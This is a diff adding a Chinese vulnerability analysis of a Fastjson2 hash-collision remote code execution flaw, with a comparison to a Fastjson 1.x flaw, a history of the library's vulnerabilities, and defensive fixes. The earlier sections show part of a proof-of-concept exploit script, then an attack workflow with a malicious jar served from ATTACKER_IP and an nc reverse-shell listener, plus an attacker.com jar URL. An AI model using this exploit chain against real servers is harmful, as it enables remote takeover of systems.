+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[Step 2] Building malicious JSON payload...&quot;</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">build_payload</span><span class="p">(</span><span class="n">collision_type</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="c1"># Step 3: 发送请求</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[Step 3] Sending payload to target: </span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Fastjson2-RCE-PoC&quot;</span>
+    <span class="p">}</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+            <span class="n">target_url</span><span class="p">,</span>
+            <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span>
+            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+            <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span>
+        <span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Response status: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Response body: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">200</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">ConnectionError</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  [!] Connection error (target may have crashed or&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;      RCE already triggered - check reverse shell)&quot;</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  [!] Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[Step 4] Check reverse shell on port 4444...&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  If successful, you should have a shell.&quot;</span><span class="p">)</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+    <span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
+        <span class="n">description</span><span class="o">=</span><span class="s2">&quot;Fastjson2 FNV-1a Hash Collision RCE PoC&quot;</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--target&quot;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Target URL (e.g., http://victim:8080/api)&quot;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--attacker-host&quot;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Attacker HTTP server IP&quot;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--attacker-port&quot;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">8888</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Attacker HTTP server port (default: 8888)&quot;</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+    <span class="n">exploit</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">attacker_host</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">attacker_port</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+
+<h3>6.5 第四步：完整利用流程</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># === 攻击者机器操作 ===</span>
+
+<span class="c1"># 1. 编译恶意类并打包</span>
+javac<span class="w"> </span>EvilClass.java
+jar<span class="w"> </span>cvf<span class="w"> </span>evil.jar<span class="w"> </span>EvilClass.class
+
+<span class="c1"># 2. 启动 JAR 托管服务器</span>
+python3<span class="w"> </span>serve_jar.py<span class="w"> </span><span class="m">8888</span><span class="w"> </span><span class="p">&amp;</span>
+<span class="nv">SERVE_PID</span><span class="o">=</span><span class="nv">$!</span>
+
+<span class="c1"># 3. 启动反弹 shell 监听</span>
+nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span><span class="w"> </span><span class="p">&amp;</span>
+<span class="nv">NC_PID</span><span class="o">=</span><span class="nv">$!</span>
+
+<span class="c1"># 4. 发送攻击 payload</span>
+python3<span class="w"> </span>exploit.py<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--target<span class="w"> </span>http://victim:8080/api/user<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--attacker-host<span class="w"> </span>ATTACKER_IP<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--attacker-port<span class="w"> </span><span class="m">8888</span>
+
+<span class="c1"># 5. 等待反弹 shell 连接</span>
+<span class="c1"># nc 输出: Connection from victim_ip</span>
+<span class="c1">#          $ whoami</span>
+<span class="c1">#          tomcat</span>
+</code></pre></div>
+
+<h3>6.6 目标端代码示例</h3>
+<p>以下是一个典型的受影响 Spring Boot 接口：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// VulnerableController.java</span>
+<span class="nd">@RestController</span>
+<span class="nd">@RequestMapping</span><span class="p">(</span><span class="s">&quot;/api&quot;</span><span class="p">)</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">UserController</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/user&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">ResponseEntity</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">createUser</span><span class="p">(</span><span class="nd">@RequestBody</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// ★ 漏洞触发点: 直接将用户输入解析为 JSON ★</span>
+<span class="w">        </span><span class="c1">// Fastjson2 ≤ 2.0.62, 默认配置</span>
+<span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span>
+<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;name&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="c1">// ...</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ResponseEntity</span><span class="p">.</span><span class="na">ok</span><span class="p">(</span><span class="s">&quot;User created: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">name</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- pom.xml (受影响依赖) --&gt;</span>
+<span class="nt">&lt;dependency&gt;</span>
+<span class="w">    </span><span class="nt">&lt;groupId&gt;</span>com.alibaba.fastjson2<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;artifactId&gt;</span>fastjson2<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;version&gt;</span>2.0.62<span class="nt">&lt;/version&gt;</span><span class="w"> </span><span class="cm">&lt;!-- ★ 受影响版本 ★ --&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+</code></pre></div>
+
+<h3>6.7 攻击链各阶段验证</h3>
+<table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>验证方法</th>
+<th>预期结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>哈希碰撞构造</td>
+<td><code>fnv1a_64(collision) == fnv1a_64("java.lang.String")</code></td>
+<td>True</td>
+</tr>
+<tr>
+<td>白名单绕过</td>
+<td>目标日志无 <code>autoType is not support</code> 异常</td>
+<td>无异常</td>
+</tr>
+<tr>
+<td>远程 JAR 下载</td>
+<td>攻击者 HTTP 服务器日志</td>
+<td>收到来自目标的 GET 请求</td>
+</tr>
+<tr>
+<td>类加载触发</td>
+<td>目标日志</td>
+<td><code>Class.forName</code> 调用</td>
+</tr>
+<tr>
+<td>静态代码块执行</td>
+<td>反弹 shell 连接</td>
+<td>nc 收到连接</td>
+</tr>
+<tr>
+<td>RCE 确认</td>
+<td>在反弹 shell 中执行 <code>id</code></td>
+<td>返回目标用户身份</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>七、与 CVE-2026-16723（Fastjson 1.x）对比分析</h2>
+<h3>7.1 CVE-2026-16723 概述</h3>
+<p>CVE-2026-16723 影响 Fastjson 1.x 的 1.2.68-1.2.83 版本。该漏洞利用 <code>checkAutoType()</code> 中的资源探测路径：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// Fastjson 1.x checkAutoType 中的资源探测（简化）</span>
+<span class="kd">public</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="nf">checkAutoType</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="p">...)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// ... 黑名单检查 ...</span>
+
+<span class="w">    </span><span class="c1">// ★ 资源探测: 将类名转换为路径并尝试加载 .class 资源 ★</span>
+<span class="w">    </span><span class="n">InputStream</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Thread</span><span class="p">.</span><span class="na">currentThread</span><span class="p">()</span>
+<span class="w">        </span><span class="p">.</span><span class="na">getContextClassLoader</span><span class="p">()</span>
+<span class="w">        </span><span class="p">.</span><span class="na">getResourceAsStream</span><span class="p">(</span><span class="n">typeName</span><span class="p">.</span><span class="na">replace</span><span class="p">(</span><span class="sc">&#39;.&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;/&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;.class&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">is</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 资源存在 → 尝试加载该类</span>
+<span class="w">        </span><span class="c1">// 这里的副作用: 如果 typeName 是 URL 格式, 会触发远程加载</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>当 <code>typeName</code> 为 <code>jar:http://attacker.com/evil.jar!/EvilClass</code> 时，<code>getResourceAsStream</code> 会通过 <code>jar:</code> 协议下载远程 JAR 并探测类资源，探测过程中触发类加载和静态代码块执行。</p>
+<h3>7.2 详细对比</h3>
+<table>
+<thead>
+<tr>
+<th>对比维度</th>
+<th>QVD-2026-45876（Fastjson2）</th>
+<th>CVE-2026-16723（Fastjson 1.x）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>影响库</strong></td>
+<td>Fastjson2</td>
+<td>Fastjson 1.x</td>
+</tr>
+<tr>
+<td><strong>影响版本</strong></td>
+<td>≤ 2.0.62</td>
+<td>1.2.68 - 1.2.83</td>
+</tr>
+<tr>
+<td><strong>修复版本</strong></td>
+<td>2.0.63+</td>
+<td>1.2.84+</td>
+</tr>
+<tr>
+<td><strong>CVSS</strong></td>
+<td>9.8</td>
+<td>9.0</td>
+</tr>
+<tr>
+<td><strong>触发条件</strong></td>
+<td>默认配置</td>
+<td>默认配置</td>
+</tr>
+<tr>
+<td><strong>需要 SupportAutoType</strong></td>
+<td>否</td>
+<td>否</td>
+</tr>
+<tr>
+<td><strong>需要 SafeMode 关闭</strong></td>
+<td>N/A（不受 SafeMode 影响）</td>
+<td>是（SafeMode 可阻止）</td>
+</tr>
+<tr>
+<td><strong>绕过机制</strong></td>
+<td>FNV-1a 哈希碰撞绕过白名单</td>
+<td><code>getResourceAsStream</code> 资源探测副作用</td>
+</tr>
+<tr>
+<td><strong>远程加载</strong></td>
+<td>ContextClassLoader + <code>jar:</code> 协议</td>
+<td><code>getResourceAsStream</code> + <code>jar:</code> 协议</td>
+</tr>
+<tr>
+<td><strong>Gadget 依赖</strong></td>
+<td>无（Gadget-free）</td>
+<td>无（Gadget-free）</td>
+</tr>
+<tr>
+<td><strong>触发位置</strong></td>
+<td><code>checkAutoType</code> 白名单检查</td>
+<td><code>checkAutoType</code> 资源探测路径</td>
+</tr>
+<tr>
+<td><strong>在野利用</strong></td>
+<td>已确认</td>
+<td>已确认</td>
+</tr>
+<tr>
+<td><strong>根因类型</strong></td>
+<td>哈希校验设计缺陷</td>
+<td>资源探测副作用设计缺陷</td>
+</tr>
+</tbody>
+</table>
+<h3>7.3 根因对比分析</h3>
+<p>两个漏洞虽然都利用了 <code>jar:</code> 协议远程加载，但绕过 AutoType 检查的机制完全不同：</p>
+<p><strong>Fastjson2（QVD-2026-45876）的根因</strong>是<strong>哈希校验的信任过度</strong>——Fastjson2 完全信任 FNV-1a 哈希结果作为类型安全判断依据，不校验类型名称明文。这是一个<strong>加密学层面</strong>的设计缺陷（使用非加密哈希做安全决策）。</p>
+<p><strong>Fastjson 1.x（CVE-2026-16723）的根因</strong>是<strong>资源探测的意外副作用</strong>——<code>checkAutoType</code> 中用 <code>getResourceAsStream</code> 探测类是否存在，本意只是检查而非加载，但 <code>jar:</code> 协议的 <code>getResourceAsStream</code> 实现会触发远程下载甚至类初始化。这是一个<strong>副作用控制</strong>的设计缺陷。</p>
+<p>两者的共同教训：<strong>反序列化框架的 AutoType 防御不应依赖单一检查点，更不应在检查过程中产生可能导致类加载的副作用</strong>。</p>
+<hr />
+<h2>八、Fastjson 漏洞史时间线</h2>
+<p>Fastjson 从诞生至今，安全漏洞层出不穷。以下是其主要 CVE 时间线：</p>
+<table>
+<thead>
+<tr>
+<th>时间</th>
+<th>版本</th>
+<th>CVE/编号</th>
+<th>漏洞类型</th>
+<th>CVSS</th>
+<th>关键特征</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2017</td>
+<td>≤1.2.24</td>
+<td>CVE-2017-18349</td>
+<td>AutoType RCE</td>
+<td>9.8</td>
+<td>无任何 AutoType 限制，直接 <code>@type</code> + JNDI</td>
+</tr>
+<tr>
+<td>2019</td>
+<td>1.2.47</td>
+<td>CVE-2019-16163</td>
+<td>AutoType 绕过</td>
+<td>9.8</td>
+<td>缓存污染绕过黑名单</td>
+</tr>
+<tr>
+<td>2019</td>
+<td>1.2.47</td>
+<td>-</td>
+<td>AutoType 绕过</td>
+<td>9.8</td>
+<td><code>java.lang.Class</code> 缓存投毒</td>
+</tr>
+<tr>
+<td>2020</td>
+<td>1.2.68</td>
+<td>-</td>
+<td>SafeMode 引入</td>
+<td>-</td>
+<td>引入 <code>safeMode</code> 全局关闭 AutoType</td>
+</tr>
+<tr>
+<td>2020</td>
+<td>1.2.68-1.2.80</td>
+<td>多个</td>
+<td>expectClass 绕过</td>
+<td>9.0</td>
+<td>Throwable/AutoCloseable 二次解析</td>
+</tr>
+<tr>
+<td>2022</td>
+<td>1.2.83</td>
+<td>-</td>
+<td>Gadget-free RCE</td>
+<td>9.0</td>
+<td>expectClass + 资源 URL 劫持</td>
+</tr>
+<tr>
+<td>2022</td>
+<td>2.0.x</td>
+<td>-</td>
+<td>Fastjson2 发布</td>
+<td>-</td>
+<td>全面重构 AutoType 防御</td>
+</tr>
+<tr>
+<td>2024</td>
+<td>2.0.50+</td>
+<td>多个</td>
+<td>各种绕过</td>
+<td>7.5-9.0</td>
+<td>持续的攻防对抗</td>
+</tr>
+<tr>
+<td>2026</td>
+<td>1.2.68-1.2.83</td>
+<td>CVE-2026-16723</td>
+<td>资源探测 RCE</td>
+<td>9.0</td>
+<td><code>getResourceAsStream</code> 副作用</td>
+</tr>
+<tr>
+<td>2026</td>
+<td>≤2.0.62</td>
+<td>QVD-2026-45876</td>
+<td>FNV-1a 碰撞 RCE</td>
+<td>9.8</td>
+<td>哈希碰撞绕过白名单</td>
+</tr>
+</tbody>
+</table>
+<h3>8.1 防御演进阶段</h3>
+<div class="highlight"><pre><span></span><code><span class="nx">Fastjson</span><span class="w"> </span><span class="nx">安全防御演进时间线</span><span class="p">:</span>
+
+<span class="mi">2017</span><span class="w"> </span><span class="err">────────────────────────────────────────────</span><span class="w"> </span><span class="mi">2026</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                                </span><span class="err">│</span>
+<span class="w">  </span><span class="err">├─</span><span class="w"> </span><span class="nx">蛮荒期</span><span class="w"> </span><span class="p">(</span><span class="err">≤</span><span class="m m-Double">1.2.24</span><span class="p">)</span><span class="w">          </span><span class="nx">无</span><span class="w"> </span><span class="nx">AutoType</span><span class="w"> </span><span class="nx">限制</span><span class="w">    </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">    </span><span class="err">└─</span><span class="w"> </span><span class="nx">直接</span><span class="w"> </span><span class="err">@</span><span class="k">type</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">JNDI</span><span class="w"> </span><span class="nx">注入</span><span class="w">                   </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                                </span><span class="err">│</span>
+<span class="w">  </span><span class="err">├─</span><span class="w"> </span><span class="nx">黑名单期</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">1.2.25</span><span class="o">-</span><span class="m m-Double">1.2.47</span><span class="p">)</span><span class="w">  </span><span class="nx">denyList</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">checkAutoType</span>
+<span class="w">  </span><span class="err">│</span><span class="w">    </span><span class="err">└─</span><span class="w"> </span><span class="nx">L前缀绕过</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="nx">缓存污染</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="nx">黑名单哈希化</span><span class="w">        </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                                </span><span class="err">│</span>
+<span class="w">  </span><span class="err">├─</span><span class="w"> </span><span class="nx">SafeMode期</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">1.2.68</span><span class="o">-</span><span class="m m-Double">1.2.83</span><span class="p">)</span><span class="w">  </span><span class="nx">safeMode</span><span class="w"> </span><span class="nx">全局关闭</span><span class="w">   </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">    </span><span class="err">└─</span><span class="w"> </span><span class="nx">expectClass</span><span class="w"> </span><span class="nx">绕过</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="nx">资源URL劫持</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="nx">资源探测</span><span class="w">  </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                                </span><span class="err">│</span>
+<span class="w">  </span><span class="err">├─</span><span class="w"> </span><span class="nx">重构期</span><span class="w"> </span><span class="p">(</span><span class="nx">Fastjson2</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="p">.</span><span class="nx">x</span><span class="p">)</span><span class="w">   </span><span class="nx">全面重构</span><span class="w"> </span><span class="nx">AutoType</span><span class="w">    </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">    </span><span class="err">└─</span><span class="w"> </span><span class="nx">FNV</span><span class="o">-</span><span class="mi">1</span><span class="nx">a</span><span class="w"> </span><span class="nx">白名单</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="nx">哈希碰撞绕过</span><span class="w">              </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">                                                </span><span class="err">│</span>
+<span class="w">  </span><span class="err">└─</span><span class="w"> </span><span class="nx">当前</span><span class="w"> </span><span class="p">(</span><span class="mi">2026</span><span class="p">)</span><span class="w">               </span><span class="nx">QVD</span><span class="o">-</span><span class="mi">2026</span><span class="o">-</span><span class="mi">45876</span><span class="w">      </span><span class="err">│</span>
+<span class="w">       </span><span class="err">└─</span><span class="w"> </span><span class="nx">哈希碰撞</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">ContextClassLoader</span><span class="w"> </span><span class="nx">远程加载</span><span class="w">     </span><span class="err">│</span>
+</code></pre></div>
+
+<h3>8.2 反复失守的根本原因</h3>
+<p>Fastjson 漏洞频发的根本原因在于其<strong>架构设计层面的安全债务</strong>：</p>
+<ol>
+<li>
+<p><strong><code>@type</code> 机制的本质矛盾</strong>：允许用户控制反序列化类型，这与"输入不可信"的安全原则根本冲突。任何基于黑名单/白名单的防御都只是延迟而非消除风险。</p>
+</li>
+<li>
+<p><strong>哈希黑/白名单的脆弱性</strong>：使用非加密哈希（FNV-1a）做安全决策，天然存在碰撞风险。黑名单只能覆盖已知威胁，白名单的哈希校验可被碰撞绕过。</p>
+</li>
+<li>
+<p><strong>JDK 类加载的副作用</strong>：Java 的 <code>Class.forName</code>、<code>getResourceAsStream</code>、<code>URLClassLoader</code> 等 API 在类加载过程中会触发网络请求、文件 I/O 等副作用。反序列化框架难以完全隔离这些副作用。</p>
+</li>
+<li>
+<p><strong>Gadget 链的不可穷尽性</strong>：JDK 和常用库中存在大量可被组合利用的类，新的 Gadget 链不断被发现，黑名单永远无法覆盖所有情况。</p>
+</li>
+</ol>
+<hr />
+<h2>九、防御方案</h2>
+<h3>9.1 版本升级（首要措施）</h3>
+<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- 升级到 Fastjson2 2.0.63+ --&gt;</span>
+<span class="nt">&lt;dependency&gt;</span>
+<span class="w">    </span><span class="nt">&lt;groupId&gt;</span>com.alibaba.fastjson2<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;artifactId&gt;</span>fastjson2<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;version&gt;</span>2.0.63<span class="nt">&lt;/version&gt;</span><span class="w"> </span><span class="cm">&lt;!-- ★ 修复版本 ★ --&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+
+<span class="cm">&lt;!-- Fastjson 1.x 升级到 1.2.84+ --&gt;</span>
+<span class="nt">&lt;dependency&gt;</span>
+<span class="w">    </span><span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;version&gt;</span>1.2.84<span class="nt">&lt;/version&gt;</span><span class="w"> </span><span class="cm">&lt;!-- ★ 修复版本 ★ --&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+</code></pre></div>
+
+<p>2.0.63 的修复措施：</p>
+<ul>
+<li>白名单检查<strong>增加类型名称明文校验</strong>，不仅依赖哈希值</li>
+<li>对 <code>jar:</code> 协议 URL 类型的 <code>@type</code> 值进行显式拦截</li>
+<li><code>checkAutoType</code> 中禁止 ContextClassLoader 加载远程资源</li>
+</ul>
+<h3>9.2 SafeMode（纵深防御）</h3>
+<p>即使升级到修复版本，也建议开启 SafeMode 作为纵深防御：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// Fastjson2 开启 SafeMode</span>
+<span class="n">JSONFactory</span><span class="p">.</span><span class="na">getDefaultObjectReaderContext</span><span class="p">()</span>
+<span class="w">    </span><span class="p">.</span><span class="na">setEnabled</span><span class="p">(</span><span class="n">JSONReader</span><span class="p">.</span><span class="na">Feature</span><span class="p">.</span><span class="na">SupportAutoType</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span>
+
+<span class="c1">// 或全局配置</span>
+<span class="n">System</span><span class="p">.</span><span class="na">setProperty</span><span class="p">(</span><span class="s">&quot;fastjson2.parser.autoTypeSupport&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;false&quot;</span><span class="p">);</span>
+
+<span class="c1">// Fastjson 1.x 开启 SafeMode</span>
+<span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setSafeMode</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+<span class="c1">// JVM 参数: -Dfastjson.parser.safeMode=true</span>
+</code></pre></div>
+
+<p>SafeMode 会完全禁用 AutoType，即使存在未知绕过也无法通过 <code>@type</code> 加载任意类。但需注意：开启 SafeMode 后，依赖 <code>@type</code> 多态反序列化的功能将失效，需评估业务影响。</p>
+<h3>9.3 迁移到 Jackson / Gson（终极方案）</h3>
+<p>Fastjson 的安全历史表明，<code>@type</code> 机制是漏洞的根源。彻底的解决方案是迁移到不默认支持类型自省的 JSON 库：</p>
+<p><strong>迁移到 Jackson</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;dependency&gt;</span>
+<span class="w">    </span><span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;artifactId&gt;</span>jackson-databind<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;version&gt;</span>2.17.0<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c1">// Jackson 默认不启用类型自省</span>
+<span class="n">ObjectMapper</span><span class="w"> </span><span class="n">mapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectMapper</span><span class="p">();</span>
+<span class="c1">// 如果需要多态反序列化, 显式启用并使用白名单</span>
+<span class="n">mapper</span><span class="p">.</span><span class="na">activateDefaultTyping</span><span class="p">(</span>
+<span class="w">    </span><span class="n">BasicPolymorphicTypeValidator</span><span class="p">.</span><span class="na">builder</span><span class="p">()</span>
+<span class="w">        </span><span class="p">.</span><span class="na">allowIfBaseType</span><span class="p">(</span><span class="s">&quot;com.mycompany.&quot;</span><span class="p">)</span><span class="w">  </span><span class="c1">// 仅允许自己的包</span>
+<span class="w">        </span><span class="p">.</span><span class="na">build</span><span class="p">(),</span>
+<span class="w">    </span><span class="n">ObjectMapper</span><span class="p">.</span><span class="na">DefaultTyping</span><span class="p">.</span><span class="na">NON_FINAL</span>
+<span class="p">);</span>
+</code></pre></div>
+
+<p><strong>迁移到 Gson</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;dependency&gt;</span>
+<span class="w">    </span><span class="nt">&lt;groupId&gt;</span>com.google.code.gson<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;artifactId&gt;</span>gson<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;version&gt;</span>2.11.0<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c1">// Gson 完全不支持 @type 自省, 天然免疫此类漏洞</span>
+<span class="n">Gson</span><span class="w"> </span><span class="n">gson</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Gson</span><span class="p">();</span>
+<span class="n">MyObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gson</span><span class="p">.</span><span class="na">fromJson</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">MyObject</span><span class="p">.</span><span class="na">class</span><span class="p">);</span>
